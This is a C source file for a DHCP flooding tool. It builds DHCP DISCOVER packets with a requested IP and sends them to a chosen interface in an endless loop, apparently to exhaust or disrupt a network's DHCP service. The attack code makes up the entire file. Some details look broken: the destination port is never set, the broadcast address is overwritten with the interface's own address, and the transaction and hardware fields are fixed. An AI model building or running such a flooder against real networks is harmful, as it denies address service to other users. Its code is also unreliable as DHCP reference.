#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_ether.h>

#define DHCP_MAGIC_COOKIE 0x63538263
#define DHCP_DISCOVER 1
#define DHCP_REQUEST 3
#define DHCP_OPTION_MESSAGE_TYPE 53
#define DHCP_OPTION_REQUESTED_IP 50
#define DHCP_OPTION_END 255

#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68

// DHCP packet structure
struct dhcp_packet {
    uint8_t op; // Message op code / message type
    uint8_t htype; // Hardware address type
    uint8_t hlen; // Hardware address length
    uint8_t hops; // Hops
    uint32_t xid; // Transaction ID
    uint16_t secs; // Seconds elapsed
    uint16_t flags; // Flags
    uint32_t ciaddr; // Client IP address
    uint32_t yiaddr; // Your (client) IP address
    uint32_t siaddr; // Server IP address
    uint32_t giaddr; // Relay agent IP address
    uint8_t chaddr[16]; // Client hardware address
    uint8_t sname[64]; // Server host name
    uint8_t file[128]; // Boot file name
    uint32_t cookie; // DHCP magic cookie
    uint8_t options[312]; // Optional parameters field
};

void create_dhcp_discover_packet(struct dhcp_packet *packet, const char *requested_ip) {
    memset(packet, 0, sizeof(struct dhcp_packet));

    packet->op = 1; // Boot Request
    packet->htype = 1; // Ethernet
    packet->hlen = 6; // Ethernet address length
    packet->xid = htonl(0x3903F326); // Transaction ID
    packet->cookie = htonl(DHCP_MAGIC_COOKIE);

    // Add DHCP options
    int offset = 0;
    packet->options[offset++] = DHCP_OPTION_MESSAGE_TYPE;
    packet->options[offset++] = 1;
    packet->options[offset++] = DHCP_DISCOVER;

    if (requested_ip) {
        packet->options[offset++] = DHCP_OPTION_REQUESTED_IP;
        packet->options[offset++] = 4;
        inet_pton(AF_INET, requested_ip, &packet->options[offset]);
        offset += 4;
    }

    packet->options[offset++] = DHCP_OPTION_END;
}

void send_dhcp_discover(int sockfd, const char *interface_name, const char *requested_ip) {
    struct ifreq ifr;
    struct sockaddr_in dest_addr;
    struct dhcp_packet packet;

    // Create the DHCP discover packet
    create_dhcp_discover_packet(&packet, requested_ip);

    // Prepare the destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);

    // Set the interface for sending the packet
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);
    ioctl(sockfd, SIOCGIFADDR, &ifr);
    dest_addr.sin_addr = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;

    // Send the packet
    if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("sendto");
        exit(EXIT_FAILURE);
    }
}

void flood (const char *interface_name, const char *requested_ip) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Set the socket to broadcast mode
    int broadcast = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0) {
        perror("setsockopt");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        send_dhcp_discover(sockfd, interface_name, requested_ip);
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <interface> <requested_ip>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *interface_name = argv[1];
    const char *requested_ip = argv[2];

    flood(interface_name, requested_ip);

    return 0;
}